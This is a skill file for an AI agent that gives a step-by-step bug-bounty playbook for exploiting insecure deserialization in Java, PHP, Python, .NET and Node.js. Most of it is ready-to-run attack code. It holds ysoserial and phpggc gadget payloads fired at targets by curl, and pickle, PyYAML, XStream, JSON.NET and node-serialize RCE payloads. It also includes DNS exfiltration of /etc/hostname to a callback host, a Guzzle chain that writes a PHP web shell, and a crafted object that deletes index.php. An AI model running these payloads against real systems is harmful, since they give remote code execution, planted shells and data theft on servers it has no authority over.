---
name: deserialization-hunter
description: Detect and exploit insecure deserialization vulnerabilities across Java (ysoserial gadget chains, XStream, Kryo, Jackson polymorphic), PHP (object injection via __wakeup/__destruct POP chains), Python (pickle, PyYAML, marshal), .NET (BinaryFormatter, JSON.NET TypeNameHandling, ViewState machineKey), and Node.js (node-serialize, serialize-javascript). Trigger on phrases like "deserialization", "Java gadget chain", "ysoserial", "PHP object injection", "pickle", "__wakeup", "TypeNameHandling", or when recon reveals serialized data in cookies, POST bodies, or hidden fields. Also trigger when Java binary blobs (starting with 0xaced or rO0), PHP `O:` strings, or .NET ViewState is observed in traffic.
---

# Deserialization Hunter Skill

Insecure deserialization is among the most impactful vulnerability classes — exploits routinely achieve Remote Code Execution (RCE) without any prior authentication. The attack surface is wider than most hunters expect: serialized objects appear in HTTP cookies, POST bodies, URL parameters, hidden form fields, WebSocket frames, message queues, and API responses. Every language ecosystem has its own gadget chain library, detection fingerprint, and exploitation tooling.

Run phases in order. Phase 1 identifies the language/framework and serialization format — every subsequent decision depends on this.

---

## Phase 1 — Fingerprint and Surface Enumeration

### Step 1.1 — Identify Serialized Data in Traffic

Capture all HTTP traffic through Caido (`http://127.0.0.1:8080`) and search for serialization fingerprints:

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/deser

# Java: binary serialization starts with magic bytes AC ED (base64: rO0)
# Java: also appears in cookies, POST bodies, hidden fields
echo "[*] Java serialization fingerprints:"
echo "    Binary: 0xACED 0x0005 (hex) | rO0 (base64) | %AC%ED (URL-encoded)"
echo "    Cookies: look for 'JSESSIONID', 'SESS_', or any base64 cookie starting with rO0"
echo "    POST body: Content-Type: application/x-java-serialized-object"

# PHP: O:<num>:"<classname>":<num>: pattern
echo "[*] PHP serialization fingerprints:"
echo "    O:8:\"stdClass\":0:{} — PHP object"
echo "    a:2:{...} — PHP array"
echo "    s:6:\"secret\"; — PHP string"
echo "    Cookies: may be base64-encoded. Decode and check for O: / a: / s:"

# Python: pickle starts with \x80\x02 or \x80\x04 (proto 2/4) or starts with 'c' (proto 0)
echo "[*] Python pickle fingerprints:"
echo "    Hex: \\x80\\x02 or \\x80\\x04 or \\x80\\x05"
echo "    BASE64: gASV or gAJ or cosystem — decode to check"

# .NET: BinaryFormatter output starts with 0x0001000
# .NET: ViewState is base64, starts with /wE or AAEAAAD
echo "[*] .NET fingerprints:"
echo "    BinaryFormatter: AAEAAAD (base64) | 0x0001000 (hex)"
echo "    ViewState: /wE or base64 blob in __VIEWSTATE form field"
echo "    JSON.NET TypeNameHandling: look for \$type or __type keys in JSON"

# Node.js: serialize-javascript / node-serialize
echo "[*] Node.js fingerprints:"
echo "    node-serialize: JSON with function() bodies as strings"
echo "    IIFE pattern: \"_$$ND_FUNC$$_function(){}()\" in cookie/body"

# Search recon output for these patterns
for PATTERN in 'rO0' 'O:[0-9]' 'AAEAAAD' '/wE' '\$type' '__type' '_\$\$ND_FUNC\$\$' 'application/x-java-serialized'; do
  HITS=$(grep -rn "$PATTERN" $TARGET_DIR/recon/ 2>/dev/null | wc -l)
  [ "$HITS" -gt 0 ] && echo "[!] Pattern '$PATTERN': $HITS hits" && \
    grep -rn "$PATTERN" $TARGET_DIR/recon/ 2>/dev/null | head -5
done
```

### Step 1.2 — Map Deserialization Entry Points

Document every discovered entry point before testing:

```bash
cat > $TARGET_DIR/recon/deser/entry-points.txt << 'EOF'
# Deserialization Entry Points Map
# Format: [TYPE] METHOD PATH NOTES
# Example:
# [JAVA] GET /profile Cookie: JSESSIONID=rO0...
# [PHP]  POST /api/data Body: data=O%3A8%3A...
# [PHP]  GET /page?obj=Tzo4...
# [.NET] POST /form __VIEWSTATE=/wE...
EOF
echo "[*] Fill entry-points.txt as you discover surfaces in Caido"
```

**Known high-value entry points to check manually:**
- `JSESSIONID` cookie (Java)
- Any cookie containing only base64 characters (any language)
- `__VIEWSTATE` / `__EVENTVALIDATION` form fields (.NET)
- `X-Java-Deserialized-Object` headers (custom apps)
- POST body with `Content-Type: application/x-java-serialized-object`
- WebSocket messages with binary payloads
- AMF (Flash) endpoints (`/messagebroker/amf`, `/blazeds`)
- XML endpoints using XStream
- RMI/JMX ports (via nuclei-scan or nmap)

---

## Phase 2 — Java Deserialization

### Step 2.1 — Detect Vulnerable Java Libraries (Gadget Chain Candidates)

Before sending payloads, determine which gadget chain to use by fingerprinting the classpath:

```bash
# Check tech fingerprint from nuclei-scan for Java framework indicators
cat $TARGET_DIR/recon/nuclei/tech-summary.txt 2>/dev/null | grep -iE 'java|spring|struts|tomcat|jboss|weblogic|websphere|glassfish|jenkins|jira'

# Probe for known Java deserialization endpoints
for PATH in \
  /invoker/JMXInvokerServlet \
  /invoker/EJBInvokerServlet \
  /jmx-console \
  /web-console \
  /manager/html \
  /axis2/services \
  /ws \
  /remoting/HttpInvokerServiceExporter \
  /spring-remoting \
  /api/json; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN$PATH")
  [ "$STATUS" != "404" ] && echo "[*] $PATH [$STATUS]"
done

# Gadget chain libraries and their ysoserial payload names:
# CommonCollections1-7  → Apache Commons Collections 3.x/4.x (ubiquitous)
# CommonsCollections6   → Works when Java 8+ breaks CC1-5
# Spring1/Spring2       → Spring Framework
# Hibernate1/Hibernate2 → Hibernate ORM
# JBossInterceptors1    → JBoss
# WebLogic1             → Oracle WebLogic
# Groovy1               → Groovy on classpath
# ROME                  → Rome RSS library
# Jdk7u21               → JDK <= 7u21 (no external dependency)
echo "[*] Priority gadget chains to try: CC6, CC1, Spring1, ROME, Jdk7u21"
```

### Step 2.2 — Detect with ysoserial DNS Callback (Safe Canary)

Probe for deserialization WITHOUT triggering a shell — just confirm the gadget chain executes:

```bash
# Install ysoserial if not present
ls ~/tools/ysoserial.jar 2>/dev/null || \
  (mkdir -p ~/tools && wget -q -O ~/tools/ysoserial.jar \
  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)

# Generate a DNS callback payload (safe — just does a DNS lookup, no shell)
# Replace COLLAB_URL with Burp Collaborator subdomain
COLLAB_URL="[your-collaborator-subdomain].oastify.com"

for CHAIN in CommonsCollections6 CommonsCollections1 Spring1 ROME Jdk7u21 Hibernate1; do
  echo "[*] Generating DNS canary for chain: $CHAIN"
  java -jar ~/tools/ysoserial.jar $CHAIN \
    "nslookup $CHAIN.$COLLAB_URL" 2>/dev/null | \
    base64 -w0 > $TARGET_DIR/recon/deser/canary-${CHAIN}.b64
  echo "    Saved: canary-${CHAIN}.b64 ($(wc -c < $TARGET_DIR/recon/deser/canary-${CHAIN}.b64) bytes)"
done

# Send each canary to the target deserialization endpoint
for CHAIN in CommonsCollections6 CommonsCollections1 Spring1 ROME Jdk7u21; do
  echo "[*] Sending $CHAIN canary to JSESSIONID cookie..."
  PAYLOAD=$(cat $TARGET_DIR/recon/deser/canary-${CHAIN}.b64)
  curl -sk \
    -H "Cookie: JSESSIONID=$PAYLOAD" \
    "https://$TARGET_DOMAIN/api/profile" \
    -w " [HTTP %{http_code}]\n" -o /dev/null
done

# Monitor Burp Collaborator — any DNS interaction = vulnerable chain confirmed
# Note the timing: interaction appears within 1-5 seconds of the request
echo "[*] Watch Collaborator for DNS callbacks from $COLLAB_URL"
```

### Step 2.3 — Exploit: Command Execution via ysoserial

Only after a DNS canary confirms a working gadget chain:

```bash
WORKING_CHAIN="CommonsCollections6"  # Replace with confirmed chain

# Step 1: Verify command execution with a time-based blind test (sleep 5)
echo "[*] Generating sleep-5 payload for out-of-band timing confirmation"
java -jar ~/tools/ysoserial.jar $WORKING_CHAIN \
  "sleep 5" 2>/dev/null | base64 -w0 > $TARGET_DIR/recon/deser/sleep-payload.b64

START=$(date +%s)
curl -sk \
  -H "Cookie: JSESSIONID=$(cat $TARGET_DIR/recon/deser/sleep-payload.b64)" \
  "https://$TARGET_DOMAIN/api/profile" -o /dev/null
END=$(date +%s)
DELAY=$((END-START))
echo "Response delay: ${DELAY}s"
[ "$DELAY" -ge 4 ] && echo "[CONFIRMED] RCE via $WORKING_CHAIN — sleep test passed"

# Step 2: Out-of-band data exfiltration (safer PoC than shell spawn)
echo "[*] Exfiltrate /etc/hostname via DNS — clean PoC for report"
java -jar ~/tools/ysoserial.jar $WORKING_CHAIN \
  "nslookup \$(cat /etc/hostname).$COLLAB_URL" 2>/dev/null | \
  base64 -w0 > $TARGET_DIR/recon/deser/exfil-hostname.b64

curl -sk \
  -H "Cookie: JSESSIONID=$(cat $TARGET_DIR/recon/deser/exfil-hostname.b64)" \
  "https://$TARGET_DOMAIN/api/profile" -o /dev/null

echo "[*] Monitor Collaborator for DNS query containing hostname"
echo "[*] Hostname in DNS query = RCE PoC complete for report"
```

### Step 2.4 — Jackson Polymorphic Deserialization

Modern Java APIs using Jackson with `enableDefaultTyping()` or `@JsonTypeInfo` are vulnerable to gadget chains through type confusion:

```bash
# Detect: look for JSON requests with $type, @class, or @c fields
echo "[*] Jackson polymorphic indicators:"
echo "    {\"@class\": \"com.example.SomeClass\", ...}"
echo "    {\"$type\": \"System.Windows.Data.ObjectDataProvider, ...\"}"

# Test: inject a known gadget type
# CVE-2019-14379 and related — test with a benign SSRF class first
for PAYLOAD in \
  '{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://'$COLLAB_URL'/test","autoCommit":true}' \
  '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://'$COLLAB_URL'/test","autoCommit":true}'; do
  echo "[*] Testing Jackson gadget: $(echo $PAYLOAD | head -c 80)..."
  curl -sk -X POST \
    -H 'Content-Type: application/json' \
    -d "$PAYLOAD" \
    "https://$TARGET_DOMAIN/api/data" \
    -w " [%{http_code}]\n" -o /dev/null
done
# Monitor Collaborator for LDAP/DNS callbacks
```

### Step 2.5 — XStream XML Deserialization

```bash
# Detect XStream: Content-Type: application/xml with custom tags, or /ws/* endpoints
# CVE-2021-29505, CVE-2021-39144, CVE-2022-40151
echo "[*] XStream RCE via dynamic proxy gadget:"
PAYLOAD='<sorted-set>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>nslookup</string><string>'$COLLAB_URL'</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>'

curl -sk -X POST \
  -H 'Content-Type: application/xml' \
  -d "$PAYLOAD" \
  "https://$TARGET_DOMAIN/api/import" \
  -w " [%{http_code}]\n" -o /dev/null

echo "[*] Monitor Collaborator — DNS hit = XStream RCE confirmed"
echo "[*] Save XStream payload to: $TARGET_DIR/recon/deser/xstream-rce.xml"
echo "$PAYLOAD" > $TARGET_DIR/recon/deser/xstream-rce.xml
```

---

## Phase 3 — PHP Object Injection

### Step 3.1 — Confirm PHP Serialized Data

```bash
# Decode any suspicious cookie or parameter and check for PHP serialization
curl -sk "https://$TARGET_DOMAIN/" -c $TARGET_DIR/recon/deser/cookies.txt -o /dev/null
cat $TARGET_DIR/recon/deser/cookies.txt

# URL-decode and base64-decode any suspicious cookie values
python3 -c "
import base64, urllib.parse, sys

cookie_val = '[paste cookie value here]'
try:
    decoded = urllib.parse.unquote(cookie_val)
    print('URL-decoded:', decoded[:100])
    if not decoded.startswith(('O:', 'a:', 's:', 'i:', 'b:')):
        b64 = base64.b64decode(decoded + '==')
        decoded2 = b64.decode('latin-1', errors='replace')
        print('b64 then UTF8:', decoded2[:100])
except Exception as e:
    print('Decode error:', e)
"

# PHP serialization format reference:
# s:6:"foobar";   — string, length 6, value "foobar"
# i:42;           — integer 42
# b:1;            — boolean true
# O:8:"UserData":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
# a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}
```

### Step 3.2 — Source Intelligence for POP Chain Construction

PHP object injection requires reaching a "magic method" (`__wakeup`, `__destruct`, `__toString`, `__call`) via a **Property-Oriented Programming (POP)** chain. Without source code knowledge, use known framework chains:

```bash
# Check for known PHP frameworks / libraries with public POP chains
cat $TARGET_DIR/recon/nuclei/tech-summary.txt 2>/dev/null | \
  grep -iE 'wordpress|drupal|laravel|symfony|yii|zend|codeigniter|joomla|magento|prestashop'

# phpggc — PHP gadget chain generator (equivalent of ysoserial for PHP)
# Install: git clone https://github.com/ambionics/phpggc
ls ~/tools/phpggc/phpggc 2>/dev/null || \
  git clone https://github.com/ambionics/phpggc ~/tools/phpggc

# List available gadget chains for detected framework
php ~/tools/phpggc/phpggc -l 2>/dev/null | grep -iE 'laravel|symfony|yii|wordpress|guzzle|monolog'

# Generate canary payload (DNS callback via file_get_contents or curl)
# Example: Laravel RCE chain
php ~/tools/phpggc/phpggc Laravel/RCE1 \
  system "nslookup $COLLAB_URL" 2>/dev/null | \
  base64 -w0 > $TARGET_DIR/recon/deser/php-laravel-rce.b64

# Guzzle chain (common, works on many frameworks using Guzzle HTTP client)
php ~/tools/phpggc/phpggc Guzzle/FW1 \
  /var/www/html/shell.php '<?php system($_GET["c"]); ?>' 2>/dev/null | \
  base64 -w0 > $TARGET_DIR/recon/deser/php-guzzle-fw.b64

echo "[*] List all available chains:"
php ~/tools/phpggc/phpggc -l 2>/dev/null | head -40
```

### Step 3.3 — Tamper Serialized Object (Simple Cases)

Before attempting RCE chains, test for privilege escalation via simple value tampering:

```bash
# If cookie is: O:8:"UserData":2:{s:4:"name";s:5:"alice";s:6:"isAdmin";b:0;}
# Tamper to:    O:8:"UserData":2:{s:4:"name";s:5:"admin";s:6:"isAdmin";b:1;}

ORIGINAL='O:8:"UserData":2:{s:4:"name";s:5:"alice";s:6:"isAdmin";b:0;}'
TAMPERED='O:8:"UserData":2:{s:4:"name";s:5:"admin";s:6:"isAdmin";b:1;}'
TAMPERED_B64=$(echo -n "$TAMPERED" | base64 -w0)

curl -sk \
  -H "Cookie: session=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TAMPERED'))")"\
  "https://$TARGET_DOMAIN/dashboard" \
  -w "\n[%{http_code}]" -o /tmp/tamper_resp.html

cat /tmp/tamper_resp.html | grep -iE 'admin|dashboard|welcome'
```

### Step 3.4 — PHP Magic Methods to Target

```bash
# If source is available (via .git exposure, LFI, backup files):
# Search for dangerous magic methods:
echo "[*] If source access is available, grep for:"
echo "    __wakeup — called on unserialize() — can trigger file ops, DB queries"
echo "    __destruct — called when object is garbage collected — can delete/write files"
echo "    __toString — called when object used as string — can trigger includes"
echo "    __call — called on undefined method calls"
echo "    __get / __set — property access hooks"

# Example dangerous pattern in source:
# class TempFile { 
#   function __destruct() { unlink($this->filename); }  // ← arbitrary file deletion
# }
# Exploit: serialize TempFile with filename=/var/www/html/index.php
TAMPERED_DELETE=$(python3 -c "
import sys
target = '/var/www/html/index.php'
# Craft: O:8:\"TempFile\":1:{s:8:\"filename\";s:<len>:\"<target>\";}
name = 'TempFile'
nlen = len(name)
tlen = len(target)
print(f'O:{nlen}:\"{name}\":1:{{s:8:\"filename\";s:{tlen}:\"{target}\";}}')
")
echo "Tampered payload: $TAMPERED_DELETE"
```

---

## Phase 4 — Python Deserialization

### Step 4.1 — Pickle RCE

Python's `pickle.loads()` executes arbitrary code during deserialization. Any user-controlled pickle input = RCE.

```bash
# Detect pickle in traffic:
# Binary: starts with \x80\x02 (proto 2) or \x80\x04 (proto 4) or \x80\x05 (proto 5)
# Base64-encoded pickle often starts with gASV or gAJ

# Generate a pickle RCE payload
python3 -c "
import pickle, base64, os

class RCE:
    def __reduce__(self):
        # DNS callback for safe PoC — replace with your Collaborator subdomain
        return (os.system, ('nslookup pickle.$COLLAB_URL',))

payload = pickle.dumps(RCE(), protocol=2)
print('Base64:', base64.b64encode(payload).decode())
print('URL-encoded:', payload.hex())
" | tee $TARGET_DIR/recon/deser/pickle-rce.txt

# Test: send the payload as cookie/parameter value
PICKLE_B64=$(python3 -c "
import pickle, base64, os
class X:
    def __reduce__(self): return (os.system, ('nslookup $COLLAB_URL',))
print(base64.b64encode(pickle.dumps(X())).decode())
")

curl -sk \
  -H "Cookie: session=$PICKLE_B64" \
  "https://$TARGET_DOMAIN/api/profile" \
  -w "\n[%{http_code}]" -o /dev/null

echo "[*] Monitor Collaborator for DNS from '$COLLAB_URL'"
```

### Step 4.2 — PyYAML Deserialization

`yaml.load()` without `Loader=SafeLoader` is vulnerable to Python object instantiation:

```bash
# Detect: API endpoints that accept YAML (Content-Type: application/yaml, application/x-yaml, text/yaml)
# Also check endpoints that accept XML and translate (some use PyYAML internally)

# Safe canary payload — triggers DNS lookup
YAML_PAYLOAD='!!python/object/apply:os.system ["nslookup '$COLLAB_URL'"]
'

curl -sk -X POST \
  -H 'Content-Type: application/x-yaml' \
  -d "$YAML_PAYLOAD" \
  "https://$TARGET_DOMAIN/api/import" \
  -w "\n[%{http_code}]" -o /dev/null

# Alternative: subprocess for cleaner PoC
YAML_PAYLOAD2='!!python/object/apply:subprocess.check_output [["nslookup", "'$COLLAB_URL'"]]'
curl -sk -X POST -H 'Content-Type: application/yaml' -d "$YAML_PAYLOAD2" \
  "https://$TARGET_DOMAIN/api/import" -w "\n[%{http_code}]" -o /dev/null

echo "[*] PyYAML safe check: if server uses yaml.safe_load() these will fail silently"
echo "[*] Monitor Collaborator for DNS callbacks"
```

### Step 4.3 — Python marshal (Rare but Present in CTF-style Apps)

```bash
# marshal.loads() is similarly dangerous to pickle — used in some caching systems
# Detect: binary data that doesn't match pickle magic bytes but decodes via marshal
python3 -c "
import marshal, base64
# Generate a marshal payload that calls os.system
code = compile(\"import os; os.system('nslookup $COLLAB_URL')\", '<string>', 'exec')
payload = marshal.dumps(code)
print(base64.b64encode(payload).decode())
"
```

---

## Phase 5 — .NET Deserialization

### Step 5.1 — ViewState Tampering and MachineKey Exploitation

```bash
# ViewState without MAC validation = trivial tampering
# ViewState with MAC but known machineKey = forge arbitrary ViewState → RCE

# Check if __VIEWSTATE MAC validation is disabled:
# Modify a character in the __VIEWSTATE value and submit
# If accepted without error → MAC validation is OFF → LowPriv data tampering possible

echo "[*] Grab __VIEWSTATE from any ASPX form"
VIEWSTATE=$(curl -sk "https://$TARGET_DOMAIN/page.aspx" | \
  grep -oP '(?<=__VIEWSTATE\" value=\")[^\"]+' | head -1)
echo "ViewState (first 60): ${VIEWSTATE:0:60}..."

# Tamper: flip one character and resubmit
TAMPERED_VS=$(echo $VIEWSTATE | sed 's/A/B/1')
curl -sk -X POST \
  -d "__VIEWSTATE=$TAMPERED_VS&__EVENTVALIDATION=&submit=Login" \
  "https://$TARGET_DOMAIN/page.aspx" | \
  grep -iE 'error|invalid|exception|mac|validation' | head -5

# If no MAC error → ViewState MAC disabled → escalate to deserialization PoC
echo "[*] If machineKey is known (from web.config leak/path traversal):"
echo "    Use YSoSerial.Net to generate a ViewState exploit:"
echo "    ysoserial.exe -p ViewState -g TextFormattingRunProperties -c 'nslookup $COLLAB_URL'"
echo "    --decryptionalg=AES --decryptionkey=[key] --validationalg=SHA1 --validationkey=[key]"
```

### Step 5.2 — JSON.NET TypeNameHandling

```bash
# Detect: JSON requests/responses with $type or __type fields, or .NET stack traces
# mentioning Newtonsoft.Json or System.Runtime.Serialization

# Test TypeNameHandling.All or TypeNameHandling.Auto:
for PAYLOAD in \
  '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c nslookup '$COLLAB_URL'"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}' \
  '{"__type":"System.Windows.Data.ObjectDataProvider:#PresentationFramework","MethodName":"Start"}'; do
  echo "[*] Testing JSON.NET TypeNameHandling payload..."
  curl -sk -X POST \
    -H 'Content-Type: application/json' \
    -d "$PAYLOAD" \
    "https://$TARGET_DOMAIN/api/data" \
    -w " [%{http_code}]\n" -o /dev/null
done

# YSoSerial.Net gadget chains for JSON.NET:
echo "[*] If confirmed vulnerable, use YSoSerial.Net:"
echo "    ysoserial.exe -f Json.Net -g ObjectDataProvider -c 'nslookup $COLLAB_URL'"
echo "    ysoserial.exe -f Json.Net -g WindowsIdentity -c 'nslookup $COLLAB_URL'"
```

### Step 5.3 — BinaryFormatter

```bash
# BinaryFormatter: AAEAAAD (base64) magic signature
# Primarily found in WCF services, .NET Remoting, custom serialization

# Detect in HTTP traffic:
echo "[*] BinaryFormatter indicators:"
echo "    Base64 blobs starting with AAEAAAD"
echo "    Content-Type: application/octet-stream or application/x-ms-serialize"
echo "    WCF SOAP with <Binary> tags"

# Generate PoC with YSoSerial.Net (run in Wine on Kali or on a Windows VM):
echo "[*] YSoSerial.Net BinaryFormatter payloads:"
echo "    ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'nslookup $COLLAB_URL'"
echo "    ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c 'nslookup $COLLAB_URL'"
echo "    ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c 'nslookup $COLLAB_URL'"
echo ""
echo "[*] Run Wine if on Kali: wine ~/tools/ysoserial-dotnet/ysoserial.exe [args]"
```

---

## Phase 6 — Node.js Deserialization

### Step 6.1 — node-serialize IIFE Injection

```bash
# Detect: cookies or POST bodies containing JSON with _$$ND_FUNC$$_ prefix
# node-serialize package (npm) evaluates function strings on deserialize()

echo "[*] node-serialize fingerprint:"
echo '    {"key":"_$$ND_FUNC$$_function(){return 1}()"}'
echo "    If this pattern is in a cookie or body → CVE-2017-5941"

# Generate exploit payload
NODE_PAYLOAD=$(python3 -c "
import json
payload = {
  'rce': '_\$\$ND_FUNC\$\$_function(){require(\"child_process\").exec(\"nslookup $COLLAB_URL\",function(error,stdout,stderr){var d=require(\"dns\");d.lookup(stdout.trim()+\".$COLLAB_URL\",function(e,a){});})}()'
}
print(json.dumps(payload))
")

# URL-encode the payload
NODE_PAYLOAD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$NODE_PAYLOAD'))")

curl -sk \
  -H "Cookie: profile=$NODE_PAYLOAD_ENC" \
  "https://$TARGET_DOMAIN/dashboard" \
  -w "\n[%{http_code}]" -o /dev/null

echo "[*] Monitor Collaborator for DNS callbacks"
```

### Step 6.2 — serialize-javascript eval() Injection

```bash
# serialize-javascript package deserializes with eval() — any JS can be injected
# Detect: response bodies or JS files containing serialized JS objects with function literals

echo "[*] serialize-javascript pattern (in responses/JS files):"
echo '    ({key:"value",fn:function(){...}})'
echo "    If user input is deserialized with require('serialize-javascript') + eval → RCE"
echo "    Payload: \"};process.mainModule.require('child_process').execSync('nslookup $COLLAB_URL');//"
```

---

## Phase 7 — Validation and PoC Documentation

### Step 7.1 — Validate Confirmed Deserialization

For all confirmed deserialization vectors:

```bash
echo "=== VALIDATION CHECKLIST ==="
echo "1. DNS callback confirmed via Burp Collaborator → code execution proven out-of-band"
echo "2. Sleep/time-delay test passed → blind code execution confirmed"
echo "3. Hostname exfiltration via DNS → server identity in PoC"
echo "4. File-write confirmed (write to web root, confirm via GET) → impact demonstrated"
echo ""
echo "=== PoC REPORT REQUIREMENTS ==="
echo "1. Serialized payload used (sanitized — no live shell payload)"
echo "2. Collaborator URL and DNS interaction screenshot"
echo "3. HTTP request and response showing the injection point"
echo "4. Gadget chain name and library version (e.g. Commons Collections 3.2.1)"
echo "5. Impact statement: RCE as [process user] on [server hostname]"
echo ""
echo "=== DO NOT ==="
echo "- Do not spawn interactive reverse shells on production targets"
echo "- Do not exfiltrate real data beyond /etc/hostname for PoC"
echo "- Do not leave payload files on target filesystem"
echo "- Do not execute payloads more than necessary for PoC confirmation"
```

### Step 7.2 — Save All Artifacts

```bash
# Summary of findings
cat > $TARGET_DIR/recon/deser/deser-summary.txt << EOF
# Deserialization Findings Summary
# Target: $TARGET_DOMAIN
# Date: $(date)

## Confirmed Vectors
# (fill after testing)

## Gadget Chains That Worked
# Chain: [name]
# Endpoint: [URL]
# Injection Point: [cookie/param/header name]
# Evidence: [Collaborator subdomain + interaction timestamp]

## Chains Tested (Not Vulnerable)
# (list)

## Pending
# (PHP chains not yet tested, etc.)
EOF
echo "[*] Saved: $TARGET_DIR/recon/deser/deser-summary.txt"
ls -la $TARGET_DIR/recon/deser/
```

---

## Tooling Reference

| Tool | Purpose | Install |
|---|---|---|
| `ysoserial` (Java) | Java gadget chain payload generator | `wget ysoserial-all.jar` from GitHub releases |
| `ysoserial.exe` / YSoSerial.Net | .NET gadget chains (BinaryFormatter, JSON.NET, ViewState) | GitHub: pwntester/ysoserial.net — run via Wine on Kali |
| `phpggc` | PHP gadget chain generator | `git clone https://github.com/ambionics/phpggc` |
| `jwt_tool` | JWT attacks (see /jwt-hunter) | `git clone https://github.com/ticarpi/jwt_tool` |
| `hashcat` | HMAC brute force | Pre-installed on Kali |
| Burp Collaborator | Out-of-band DNS/HTTP callback detection | Built into Burp Suite Pro |
| `python3 pickle` | Craft Python pickle payloads | Built-in stdlib |

---

## Severity Reference

| Finding | Severity |
|---|---|
| Java deserialization RCE via gadget chain (confirmed DNS callback + sleep) | Critical |
| PHP RCE via phpggc chain (confirmed) | Critical |
| Python pickle RCE (confirmed) | Critical |
| .NET BinaryFormatter RCE via YSoSerial.Net | Critical |
| .NET ViewState RCE via known machineKey | Critical |
| JSON.NET TypeNameHandling RCE | Critical |
| Node.js node-serialize IIFE RCE | Critical |
| XStream XML deserialization RCE | Critical |
| Jackson polymorphic SSRF (DNS callback only, no code exec) | High |
| PHP object injection — privilege escalation via tampered role/admin claims | High |
| PHP object injection — arbitrary file deletion/write (no RCE) | High |
| ViewState MAC disabled (tampering possible, no RCE) | Medium |
| .NET TypeNameHandling observable but no RCE gadget found | Low–Medium |

---

## Guiding Principles

- **DNS callback is your first confirmation, not your PoC.** A DNS hit in Collaborator proves code execution but is insufficient for a Critical report. Always follow up with hostname exfiltration or a time-delay test to produce undeniable evidence.
- **Try CC6 before CC1 on modern Java.** `CommonsCollections1` requires Java ≤ 8u71. `CommonsCollections6` works on modern JDKs where CC1 fails silently. Start with CC6 and ROME.
- **PHP object injection without source = guessing.** If you don't have a route to source code (`.git` exposure, backup, LFI), use phpggc framework chains first — they target public gadgets in known libraries. Value-tampering tests (isAdmin, role) are always worth trying regardless of source access.
- **Pickle in Python is always Critical — no gadget chain needed.** Unlike Java, Python pickle RCE requires zero classpath knowledge. If any endpoint deserializes user-controlled pickle data, it is immediately and unconditionally exploitable.
- **Do not run a reverse shell on production.** Use DNS exfiltration of `/etc/hostname` as the PoC payload. It proves RCE, leaks no sensitive data, and leaves no persistent access that could be weaponized by other parties or create liability.
- **ViewState without MAC is Medium, not Critical.** You can tamper data but you cannot execute code unless a machineKey is also known. Don't overstate the impact — document exactly what you can and cannot do.
- **YAML safe_load() is not exploitable.** `yaml.safe_load()` (Python) and `yaml.load(s, Loader=SafeLoader)` reject `!!python/object` tags. Confirm the endpoint actually uses unsafe `yaml.load()` before claiming this is a finding.
- **Always run /triager before submitting.** Deserialization RCE is one of the most frequently duplicated classes on HackerOne. Check /dedup-check against the program's disclosed reports before submitting.
